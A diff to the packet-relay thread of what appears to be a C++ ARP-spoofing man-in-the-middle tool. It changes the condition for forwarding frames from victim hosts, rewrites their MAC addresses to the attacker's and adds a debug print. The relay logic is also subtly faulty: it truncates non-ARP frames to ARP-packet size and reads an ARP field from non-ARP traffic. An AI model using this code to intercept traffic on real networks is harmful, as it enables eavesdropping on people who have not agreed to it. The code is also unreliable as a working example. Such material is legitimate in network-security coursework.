@@ -282,14 +282,18 @@ void relay_thread() {
     while (1) {
         int res = pcap_next_ex(relayhandle, &header, &relaypacket);
         const EthArpPacket* eth_relay = reinterpret_cast<const EthArpPacket*>(relaypacket);
+		
 
-        if (eth_relay->eth_.type() != EthHdr::Arp && eth_relay->eth_.dmac().isBroadcast() && senderMacSet.find(eth_relay->eth_.smac()) != senderMacSet.end()) {
+        if (eth_relay->eth_.type() != EthHdr::Arp && !eth_relay->eth_.dmac().isBroadcast() && senderMacSet.find(eth_relay->eth_.smac()) != senderMacSet.end()) {
             EthArpPacket relay_copy;
             memcpy(&relay_copy, eth_relay, sizeof(EthArpPacket));
 			Mac smac = relay_copy.eth_.smac_;
             relay_copy.eth_.smac_ = attackerMac;
 			relay_copy.eth_.dmac_ = MacNet[smac]; //targetMac
 
+			printf("create relay for %s \n", 
+				static_cast<string>(relay_copy.arp_.sip()).c_str());
+			// cout<<static_cast<string>(relay_copy.arp_.sip())<<endl;
             pcap_sendpacket(relayhandle, reinterpret_cast<const u_char*>(&relay_copy), sizeof(EthArpPacket));
         }
     }
